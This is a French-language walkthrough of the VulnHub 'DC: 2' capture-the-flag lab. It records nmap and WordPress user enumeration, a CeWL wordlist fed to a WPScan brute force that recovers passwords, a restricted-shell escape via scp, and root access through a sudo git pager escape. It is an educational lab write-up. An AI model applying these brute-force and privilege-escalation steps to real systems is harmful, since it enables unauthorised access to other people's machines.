---
title: "Solution du CTF DC: 2 de VulnHub"
tags: [VulnHub, CTF]
---

[DC: 2](https://vulnhub.com/entry/dc-2,311/) est le second opus de la série de CTF proposée sur _VulnHub_. On reste globalement dans du classique.

```
Nmap scan report for 192.168.56.131
Host is up (0.00064s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Did not follow redirect to http://dc-2/
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 52517b6e70a4337ad24be10b5a0f9ed7 (DSA)
|   2048 5911d8af38518f41a744b32803809942 (RSA)
|   256 df181d7426cec14f6f2fc12654315191 (ECDSA)
|_  256 d9385f997c0d647e1d46f6e97cc63717 (ED25519)
MAC Address: 08:00:27:4F:AF:E5 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On peut relancer Nmap avec le script `vuln` qui détecte un Wordpress et dump la liste des utilisateurs :

```bash
sudo nmap -sC --script vuln -p80 192.168.56.131
```

On a ainsi trois utilisateurs enregistrés :

```
80/tcp   open  http
| http-enum: 
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2 
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-wordpress-users: 
| Username found: admin
| Username found: tom
| Username found: jerry
|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'
|_http-dombased-xss: Couldn't find any DOM based XSS.
```

Sur le site, on trouve aussi un premier flag :

> **Flag 1:**
> 
> Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.
> 
> More passwords is always better, but sometimes you just can’t win them all.
> 
> Log in as one to see the next flag.
> 
> If you can’t find it, log in as another.

On va donc avoir recours à [GitHub - digininja/CeWL: CeWL is a Custom Word List Generator](https://github.com/digininja/CeWL). On va s'en tenir à la page d'index. Le site est de toute façon remplit de *Lorem Ipsum*.
Sur les Wordpress il faut généralement passer le nom d'hôte sans quoi certaines requêtes échouent. On passe donc l'option supplémentaire `--add-host` à Docker.

```bash
docker run --add-host dc-2:192.168.56.131 -it --rm cewl http://dc-2/ > words.txt
```

Avec la wordlist obtenue on lance `WPscan` pour tenter de casser un ou plusieurs comptes :

```bash
docker run -v /tmp:/data  --add-host dc-2:192.168.56.131 -it --rm wpscanteam/wpscan --url http://dc-2/ -U admin,tom,jerry -P /data/words.txt
```

On en obtient deux. Aucun n'est administrateur :

```
[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient
```

Une fois connecté sur le Wordpress on trouve un second flag :

> **Flag 2:**
> 
> If you can't exploit WordPress and take a shortcut, there is another way.
> 
> Hope you found another entry point.

Les identifiants de `tom` permettant un accès SSH. On trouve là un autre flag :

> Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.

En revanche nous sommes gênés par un bash restreint :

```console
tom@DC-2:~$ ls
flag3.txt  usr
tom@DC-2:~$ id
-rbash: id: command not found
tom@DC-2:~$ echo $PATH
/home/tom/usr/bin
tom@DC-2:~$ export PATH=/usr/local/bin:/usr/bin:/bin:/sbin:/usr/sbin
-rbash: PATH: readonly variable
tom@DC-2:~$ /bin/bash
-rbash: /bin/bash: restricted: cannot specify `/' in command names
```

Le `rbash` semble suffisamment restreint. On a beau voir avec `Vi` que le `PATH` est déclaré à `/home/tom/usr/bin` dans le `.bashrc`, ce dernier est ignoré par le `rbash` donc l'éditer ne sert à rien.

On va faire avec la liste des binaires présents dans le `PATH` :

```console
tom@DC-2:~$ ls -al usr/bin
total 8
drwxr-x--- 2 tom tom 4096 Mar 21  2019 .
drwxr-x--- 3 tom tom 4096 Mar 21  2019 ..
lrwxrwxrwx 1 tom tom   13 Mar 21  2019 less -> /usr/bin/less
lrwxrwxrwx 1 tom tom    7 Mar 21  2019 ls -> /bin/ls
lrwxrwxrwx 1 tom tom   12 Mar 21  2019 scp -> /usr/bin/scp
lrwxrwxrwx 1 tom tom   11 Mar 21  2019 vi -> /usr/bin/vi
```

Tenter de sortir avec `Vi` semble échouer, car le même shell doit être appelé pour exécuter les commandes via `:!commande`. Je n'ai pas fouillé plus loin, mais je suis sûr qu'il y a différentes méthodes pour s'en sortir.

J'ai préféré copier bêtement bash dans le dossier autorisé via `scp` :

```console
tom@DC-2:~$ scp -P 7744 tom@127.0.0.1:/bin/bash usr/bin/
The authenticity of host '[127.0.0.1]:7744 ([127.0.0.1]:7744)' can't be established.
ECDSA key fingerprint is df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[127.0.0.1]:7744' (ECDSA) to the list of known hosts.
tom@127.0.0.1's password: 
bash                                                                                                                                                                            100% 1080KB   1.1MB/s   00:00    
tom@DC-2:~$ bash
tom@DC-2:~$ id
uid=1001(tom) gid=1001(tom) groups=1001(tom)
tom@DC-2:~$ su jerry
Password: 
jerry@DC-2:/home/tom$ id
uid=1002(jerry) gid=1002(jerry) groups=1002(jerry)
```

On a pu sauter vers le compte jerry via `su` comme indiqué dans le flag. Avec ce nouveau compte, on obtient le 4ᵉ flag :

> Good to see that you've made it this far - but you're not home yet.    
> 
> You still need to get the final flag (the only flag that really counts!!!).     
> 
> No hints here - you're on your own now.  :-)  
> 
> Go on - git outta here!!!!

```console
jerry@DC-2:/home/tom$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
```

Il y a un [GTFObin](https://gtfobins.github.io/gtfobins/git/#sudo) qui exploite l'appel à un pager par Git :

```console
jerry@DC-2:/home/tom$ sudo /usr/bin/git -p help config
GIT-CONFIG(1)                                                                                    Git Manual                                                                                    GIT-CONFIG(1)



NAME
       git-config - Get and set repository or global options

SYNOPSIS
       git config [<file-option>] [type] [-z|--null] name [value [value_regex]]
       git config [<file-option>] [type] --add name value
       git config [<file-option>] [type] --replace-all name value [value_regex]
--- snip ---
        2. can not write to the config file (ret=4),

!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
final-flag.txt
# cat final-flag.txt
 __    __     _ _       _                    _ 
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ 
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   


Congratulatons!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it's all greatly
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7.
```


